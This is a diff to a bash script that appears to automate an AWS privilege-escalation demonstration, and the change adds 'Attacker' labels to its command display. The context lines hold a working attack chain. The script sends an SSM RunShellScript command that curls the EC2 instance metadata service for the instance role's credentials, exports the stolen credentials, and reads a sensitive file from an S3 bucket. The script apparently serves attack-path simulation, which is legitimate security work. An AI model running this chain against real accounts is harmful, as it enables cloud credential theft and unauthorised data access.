@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -106,7 +108,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -118,7 +120,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -126,7 +128,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
-show_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
+show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -137,7 +139,7 @@ echo ""
 # Step 5: Discover target EC2 instance (optional but helpful)
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
 echo "Listing EC2 instances with their attached IAM roles..."
-show_cmd aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text"
 INSTANCE_INFO=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -164,7 +166,7 @@ RETRY_COUNT=0
 SSM_READY=false
 
 while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
-    show_cmd aws ssm describe-instance-information --region $AWS_REGION --filters "Key=InstanceIds,Values=$INSTANCE_ID" --query 'InstanceInformationList[0].PingStatus' --output text
+    show_cmd "Attacker" "aws ssm describe-instance-information --region $AWS_REGION --filters "Key=InstanceIds,Values=$INSTANCE_ID" --query 'InstanceInformationList[0].PingStatus' --output text"
     SSM_STATUS=$(aws ssm describe-instance-information \
         --region $AWS_REGION \
         --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
@@ -196,7 +198,7 @@ echo -e "${YELLOW}Step 7: Sending SSM command to extract instance role credentia
 echo "This is the privilege escalation vector..."
 echo "Executing command to retrieve credentials from instance metadata service"
 
-show_attack_cmd aws ssm send-command --region $AWS_REGION --instance-ids "$INSTANCE_ID" --document-name "AWS-RunShellScript" --parameters 'commands=["TOKEN=\$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)","curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$EC2_ROLE_NAME"' 2>/dev/null"]' --query 'Command.CommandId' --output text
+show_attack_cmd "Attacker" "aws ssm send-command --region $AWS_REGION --instance-ids "$INSTANCE_ID" --document-name "AWS-RunShellScript" --parameters 'commands=["TOKEN=\$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)","curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$EC2_ROLE_NAME"' 2>/dev/null"]' --query 'Command.CommandId' --output text"
 COMMAND_ID=$(aws ssm send-command \
     --region $AWS_REGION \
     --instance-ids "$INSTANCE_ID" \
@@ -226,7 +228,7 @@ WAIT_TIME=0
 COMMAND_COMPLETE=false
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
-    show_cmd aws ssm list-commands --region $AWS_REGION --command-id "$COMMAND_ID" --query 'Commands[0].Status' --output text
+    show_cmd "Attacker" "aws ssm list-commands --region $AWS_REGION --command-id "$COMMAND_ID" --query 'Commands[0].Status' --output text"
     COMMAND_STATUS=$(aws ssm list-commands \
         --region $AWS_REGION \
         --command-id "$COMMAND_ID" \
@@ -258,7 +260,7 @@ echo ""
 # Step 9: Retrieve command output containing credentials
 echo -e "${YELLOW}Step 9: Retrieving command output with extracted credentials${NC}"
 
-show_cmd aws ssm list-command-invocations --region $AWS_REGION --command-id "$COMMAND_ID" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text
+show_cmd "Attacker" "aws ssm list-command-invocations --region $AWS_REGION --command-id "$COMMAND_ID" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
 CREDS_JSON=$(aws ssm list-command-invocations \
     --region $AWS_REGION \
     --command-id "$COMMAND_ID" \
@@ -296,7 +298,7 @@ export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 echo -e "${GREEN}✓ Now using extracted EC2 instance role credentials${NC}\n"
@@ -306,7 +308,7 @@ echo -e "${YELLOW}Step 11: Verifying S3 bucket access${NC}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
 
 echo -e "\nListing bucket contents..."
-show_attack_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
+show_attack_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION; then
     echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
 else
@@ -315,7 +317,7 @@ else
 fi
 
 echo -e "\nReading sensitive data file..."
-show_attack_cmd aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION
+show_attack_cmd "Attacker" "aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION"
 if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION; then
     echo -e "\n${GREEN}✓ Successfully read sensitive data!${NC}"
     echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
